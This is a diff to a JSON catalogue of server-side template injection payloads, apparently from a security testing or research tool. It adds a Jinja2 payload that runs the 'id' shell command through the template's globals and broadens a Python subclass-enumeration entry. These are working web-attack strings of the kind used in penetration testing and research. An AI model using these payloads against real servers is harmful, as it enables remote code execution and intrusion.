@@ -60,15 +60,26 @@
       "source": "公开 SSTI 研究"
     },
     {
-      "id": "ssti-tornado",
-      "title": "Tornado 表达式",
+      "id": "ssti-python-mro",
+      "title": "Python 对象链枚举",
       "category": "Python 系",
       "code": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
-      "desc": "通过 Python 对象继承链枚举子类，寻找可利用的模块。",
-      "tags": ["ssti", "python", "tornado"],
+      "desc": "通过 Python 对象继承链枚举子类寻找可利用模块，Jinja2、Tornado 等 Python 模板引擎通用；回显的是子类列表，需再按索引定位 os 等模块。",
+      "tags": ["ssti", "python", "jinja2", "tornado"],
       "vars": [],
       "risk": "attack",
       "source": "公开 SSTI 研究"
+    },
+    {
+      "id": "ssti-jinja-self",
+      "title": "Jinja2 self 全局链",
+      "category": "Python 系",
+      "code": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+      "desc": "通过 self 访问模板全局命名空间与内建模块，是 cycler、lipsum 被过滤后的常见替代链，Flask/Jinja2 下可用。",
+      "tags": ["ssti", "jinja2", "flask", "rce"],
+      "vars": [],
+      "risk": "attack",
+      "source": "PortSwigger Web Security Academy"
     },
     {
       "id": "ssti-twig-rce",
@@ -144,6 +155,7 @@
       "desc": "Handlebars 原型链利用链，版本差异较大，仅作研究参考。",
       "tags": ["ssti", "handlebars", "node", "rce"],
       "vars": [],
+      "literalBraces": true,
       "risk": "attack",
       "source": "公开 Handlebars SSTI 研究"
     },
